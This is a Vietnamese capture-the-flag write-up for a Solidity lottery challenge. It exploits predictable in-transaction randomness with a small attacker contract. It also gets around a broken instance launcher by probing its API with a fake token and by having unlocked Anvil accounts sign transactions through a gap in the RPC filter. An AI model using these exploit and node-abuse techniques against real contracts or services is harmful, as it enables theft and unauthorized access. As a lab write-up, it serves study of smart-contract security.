# lottery - Web3 (299 pts)

**Flag:** `CSSCTF{CSS{U5E_4_R4ND0M_FUNCT10N}}`
**File đính kèm:** `Lottery.sol` (1153 B, SHA256: `38f58ac2...`), `Setup.sol` (314 B, SHA256: `ebb2b795...`)

## Đề bài

Hệ thống cung cấp hai tệp tin cấu trúc Solidity và một dịch vụ mạng hoạt động tại địa chỉ `34.116.80.78:31338`. Mã nguồn `Lottery.sol` duy trì một cơ chế ghi nhận chuỗi chiến thắng (winning streak). Đối với mỗi lượt gọi hàm `guess(_guess)`, hợp đồng thông minh (contract) sẽ tính toán tham số mục tiêu `target = random() % 100`. Nếu dự đoán chính xác, biến đếm `streaks[msg.sender]` sẽ được cộng 1; nếu sai, biến này bị đặt lại về 0. Khi chuỗi đoán đúng đạt ngưỡng 10 lần liên tiếp, quyền chỉ định `winner = msg.sender` sẽ được kích hoạt. Tệp `Setup.sol` chỉ chứa một điều kiện xác thực chiến thắng duy nhất:

```solidity
function isSolved() external view returns (bool) {
    return lottery.winner() != address(0);
}
```

Giao thức qua netcat (nc) chia hệ thống thành bộ ba thao tác: `1 launch new instance` (khởi tạo phiên bản), `2 kill instance` (hủy phiên bản), và `3 get flag` (truy xuất cờ). Lệnh khởi tạo (1) sẽ xuất ra mã nhận diện UUID, điểm cuối mạng (RPC endpoint), khóa cá nhân (private key) và địa chỉ hợp đồng cấu hình (Setup contract). Quá trình đăng nhập sử dụng mã xác thực (Ticket) định danh tên đội thi đấu, lưu ý có phân biệt chữ hoa, chữ thường.

## Phân tích ban đầu

Đánh giá kỹ thuật trên tệp `Lottery.sol` xác định ba lỗ hổng logic nghiêm trọng:

1. Kiến trúc hàm `random()`: Hàm được chỉ định bằng bổ ngữ `view`, không tiếp nhận tham số đầu vào, và chỉ dựa trên việc băm các thành phần `blockhash(block.number - 1)`, `block.timestamp`, `block.difficulty`. Do trong cùng một chu kỳ giao dịch (transaction), ba giá trị hằng số khối (block) này là bất biến, nên `random()` sẽ sinh ra cùng một kết quả cho mọi lần gọi trong một giao dịch.
2. Quá trình sinh giá trị `target`: Hàm `guess()` tính lại biến `target = random() % 100` bằng cùng một công thức với hàm `random()`. Hợp đồng không sử dụng giá trị muối ngẫu nhiên (salt) hoặc bất kỳ cơ chế lưu trữ bí mật độc lập nào.
3. Không tồn tại cơ chế hạn ngạch: Hợp đồng thiếu các điều kiện kiểm duyệt (`require`) giới hạn số lượt gọi hàm `guess` trên mỗi giao dịch, đồng thời không áp đặt lệnh hạn chế kiểm tra `tx.origin`.

Định nghĩa chiến thắng tại hàm `isSolved` (`winner != address(0)`) không ràng buộc tính minh bạch của địa chỉ người tham gia (player address). Do đó, một hợp đồng trung gian (proxy contract) vẫn hoàn toàn đủ thẩm quyền đứng tên là `winner`. Kết hợp các yếu tố này, chuỗi tấn công lý thuyết hình thành: thiết lập một giao dịch duy nhất chứa vòng lặp 10 lần `{ t = random()%100; guess(t) }`.

Hệ thống hoạt động dưới dạng một bản sao (mainnet fork) của chuỗi khối chính thay vì là một chuỗi trắng (white-label chain). Điều này được xác nhận khi gọi `eth_chainId` (trả về giá trị `0x1`) và `eth_blockNumber` (ở khoảng khối `26096389`). Thông số `block.difficulty` do Anvil giả lập mặc định bằng 0, tuy nhiên chi tiết này không tác động tới chuỗi khai thác do phương pháp tấn công không yêu cầu dự đoán cấu trúc toán học của các tham số.

## Chuỗi khai thác

**Bước 1 - Khởi tạo Hợp đồng tấn công (Attacker contract) tích hợp giao dịch đa bước.** 
Nhằm đảm bảo tham số `random()` luôn là một hằng số, toàn bộ quy trình gửi chuỗi 10 lượt đoán bắt buộc phải đóng gói trong một chu kỳ giao dịch duy nhất:

```solidity
contract Attacker {
    address public immutable lottery;
    constructor(address _lottery) { lottery = _lottery; }
    function run(uint256 _n) external {
        for (uint256 i = 0; i < _n; i++) {
            uint256 target = ILottery(lottery).random() % 100;
            ILottery(lottery).guess(target);
        }
    }
}
```

Kiểm thử trên mô hình giả lập cục bộ tương thích hoàn toàn cấu trúc `Setup.sol` nguyên bản: gọi hàm `run(10)` tiêu tốn tổng cộng 117.955 gas, trạng thái biến `winner` cập nhật sang địa chỉ kẻ tấn công, và hàm `isSolved()` trả về trạng thái `true`.

**Bước 2 - Phân tích lỗi hệ thống cấp phát phiên bản.** 
Hệ thống khởi tạo (Launcher) gặp sự cố ngừng hoạt động từ mốc thời gian 13:50 tới 15:51. Chức năng `1` (launch) in ra chuỗi cảnh báo lỗi phân tách JSON: `json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)` tại đường dẫn `eth_sandbox/launcher.py:99`. Hiện tượng này khẳng định máy chủ tại cổng `/new` trả về một dữ liệu phi cấu trúc JSON. Trong quãng thời gian này, thực hiện gọi `GET http://34.116.80.78:8546/` vẫn hiển thị trạng thái `sandbox is running!`. Việc gửi yêu cầu `POST /new` kèm theo mã định danh giả (fake bearer) kích hoạt trả về JSON chuẩn, chứng minh API vẫn hoạt động nhưng bị lỗi trong phân luồng xử lý xác thực:

```text
http=200 bytes=32 type=application/json
{"error":"nice try","ok":false}
```

Sau khi hệ thống phục hồi, chức năng `1` chỉ cung cấp hai luồng dữ liệu (UUID và RPC) và dừng lại:

```text
uuid:           17d5c78a-b92e-480c-aa67-4d60eb754b44
rpc endpoint:   http://34.116.80.78:8546/17d5c78a-b92e-480c-aa67-4d60eb754b44
```

Hệ thống mất khả năng cung cấp khóa cá nhân (`private key`) và địa chỉ thiết lập (`setup contract`). Dù vậy, do instance mạng (RPC endpoint) vẫn đang hoạt động, việc khai thác sẽ tiếp tục theo phương thức khác biệt mà không cần gửi lệnh khởi tạo lại.

**Bước 3 - Triển khai giao dịch trong điều kiện khuyết Private Key.** 
Phân tích bộ lọc an ninh `server.py` của sandbox: hệ thống áp dụng cơ chế chặn dựa theo phân vùng giao thức (namespace), và cấu hình cụ thể chỉ cấm `eth_sendUnsignedTransaction`. Các lệnh định danh như `anvil_*` cũng bị khước từ (`invalid request`), nhưng lệnh cơ bản `eth_sendTransaction` lại không bị giới hạn. Máy chủ Anvil nội bộ vốn khởi động trong tình trạng mọi tài khoản mặc định (account unlocked) đã được mở khóa, do đó có thể ra lệnh cho chính node mạng lưới giả mạo chữ ký (sign):

```text
-- Danh sách accounts
["0xacccf717a6a03135d282e3b2767210106c7eab1c","0x6fbc29b5519b8e3f757f950e80db05af5dcb000e"]
-- Kiểm duyệt quyền gửi sendTransaction
{"jsonrpc":"2.0","id":3,"result":"0x2468973e8cf8f206bd15b21ae47fae613a9d9f3fc22814ccf1253463f7ca53bf"}
```

Kết quả: Tài khoản `accounts[0]` là tài khoản cấp quyền (deployer) xây dựng cấu trúc `Setup`, trong khi `accounts[1]` là tài khoản người chơi (player). Cả hai đều mang số dư khả dụng lên tới 5000 ETH (`0x10f0cf064dd59200000`).

**Bước 4 - Tính toán quy ngược địa chỉ Hợp đồng (Contract Address).** 
Cấu trúc `Setup` do tài khoản cấp quyền khởi tạo tại trạng thái nonce bằng 0. Cấu trúc `Lottery` sau đó được `Setup` tạo với thông số nonce bằng 1. Việc nội suy không gian mạng (CREATE hash arithmetic) cho phép tìm ra địa chỉ mà không yêu cầu hệ thống trả về:

```python
def create_address(sender, nonce):
    h = keccak.new(digest_bits=256)
    h.update(rlp.encode([bytes.fromhex(sender[2:]), nonce]))
    return to_checksum_address("0x" + h.digest()[12:].hex())
```

Địa chỉ luận ra chứa chính xác 726 byte định dạng mã. Khi truy vấn hàm gọi `lottery()`, nó tiếp tục trả về một địa chỉ khác, chứng thực tuyệt đối đây là địa chỉ gốc `Setup` của hệ thống:

```text
Ứng cử viên địa chỉ 0xE5Bf39E2a633f350eA183716b898b601530cBc85 độ dài code 726 bytes -> định tuyến tới lottery() 0x13b4Edba63FAcaDC68232DAFDAaF31f76Ca72A3b
```

**Bước 5 - Thực thi khai thác.** 
Triển khai hợp đồng `Attacker(lottery)` thông qua tài khoản `accounts[1]`, thực hiện hàm gọi `run(10)`:

```text
Attacker deployed: Địa chỉ 0xF9351e4ad9D74d9683ABc494a4AA389C0F1A98C2 trạng thái 0x1
Thực thi run(10) trạng thái: 0x1 tài nguyên gas tiêu hao: 135055
Trạng thái winner: 0xF9351e4ad9D74d9683ABc494a4AA389C0F1A98C2
Kiểm chứng isSolved: True
```

**Bước 6 - Thu thập Cờ (Flag).** 
Khối cờ không được lưu trữ on-chain. Hàm `get_flag` thuộc launcher hoạt động độc lập bằng việc đọc tệp định danh đội `/tmp/<team_id>` (tệp này được hệ thống tạo ra ngay khi deploy thành công) và sau đó giao tiếp với RPC truy vấn biến `isSolved()`. Sử dụng lệnh thao tác `3` kết hợp mã định danh (Ticket):

```text
>> 3
ticket please:
>> R3:TURИ
CSS{U5E_4_R4ND0M_FUNCT10N}
```

**Xác thực tính độc lập:** Chức năng `3` được khởi tạo 2 lần tại mốc thời gian cách xa nhau (15:55:15 và 15:56:03), kết quả hoàn toàn đồng nhất. Cấu trúc văn bản chuỗi cũng đồng thời xác nhận phương pháp tiếp cận: `U5E_4_R4ND0M_FUNCT10N` là mật ngữ giải mã của "USE A RANDOM FUNCTION". Kết thúc bằng thao tác hủy cấu trúc (`2` + ticket) và nhận thông báo `Instance killed`, khẳng định mọi luồng thao tác hoàn toàn chính danh.

## Flag

Quá trình chạy lệnh xuất cờ:

```bash
python exploit.py http://34.116.80.78:8546/17d5c78a-b92e-480c-aa67-4d60eb754b44 "R3:TURИ"
```

Kết xuất dữ liệu:
```text
CSS{U5E_4_R4ND0M_FUNCT10N}
Ghi đè định dạng: CSSCTF{CSS{U5E_4_R4ND0M_FUNCT10N}}
```

## Reproduce

Quá trình tự động tái thiết lập:

```bash
python exploit.py <rpc-endpoint-cua-instance> "<ten doi>"
```

Quy trình tự động hoạt động mượt mà không cần thông số cấu hình Private Key và Setup Address. Thuật toán trực tiếp trích xuất tài khoản từ nút, phân định Setup qua tính toán số học (CREATE), kiểm chứng bằng phương thức Getter, khởi tạo mã nguồn `analysis/Attacker.sol`, và gọi tương tác API để xuất cờ. Thử nghiệm trên môi trường kiểm soát (offline replica) yêu cầu mô phỏng đúng các biến cấu hình của Launcher:

```bash
anvil --chain-id 31337 --block-base-fee-per-gas 0 --accounts 2 --balance 5000
```
